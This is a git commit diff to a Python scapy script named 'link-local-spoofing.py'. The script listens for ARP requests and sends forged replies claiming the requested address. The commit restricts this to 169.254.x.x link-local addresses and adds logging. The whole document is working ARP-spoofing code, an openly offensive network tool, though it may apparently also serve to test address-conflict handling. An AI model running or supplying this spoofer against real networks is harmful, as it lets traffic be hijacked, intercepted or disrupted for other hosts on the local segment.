8930fe4a1acb50c7a3522a4d2849234894daed28
David Dyck <david@ddyck.ca>
2021-04-12 22:59:57 -0500

    Modified spoofing to only target LL addresses

--- link-local-spoofing/link-local-spoofing.py
+++ link-local-spoofing/link-local-spoofing.py
@@ -1,19 +1,23 @@
 import scapy.all as scapy
-import time
 import sys
+import re 
 
+ll_re = re.compile(r"^169\.254\.")
 who= 1
 is_at = 2
 iface_global = ""
 def send_reply(ip,  req_mac, req_ip):
     pkt = scapy.Ether(dst=req_mac)/scapy.ARP(op = is_at, pdst = req_ip, hwdst = req_mac, psrc = ip)
+    print("Sending packet:")
     print(scapy.ls(pkt))
     scapy.sendp(pkt, verbose = True,  iface=iface_global)
 
 def handle_arp_packet(pkt):
     if pkt[scapy.ARP].op == who:
-        print('Got ARP request for ',  pkt[scapy.ARP].pdst, "from ", pkt[scapy.Ether].src,  "/",  pkt[scapy.ARP].psrc, " replying saying we do")
-        send_reply(pkt[scapy.ARP].pdst,  pkt[scapy.Ether].src, pkt[scapy.ARP].psrc)
+        ll_match = ll_re.match(str(pkt[scapy.ARP].pdst ))
+        if ll_match:
+            print('Got ARP request for ',  pkt[scapy.ARP].pdst, "from ", pkt[scapy.Ether].src,  "/",  pkt[scapy.ARP].psrc, " replying saying we do")
+            send_reply(pkt[scapy.ARP].pdst,  pkt[scapy.Ether].src, pkt[scapy.ARP].psrc)
     
     return
 
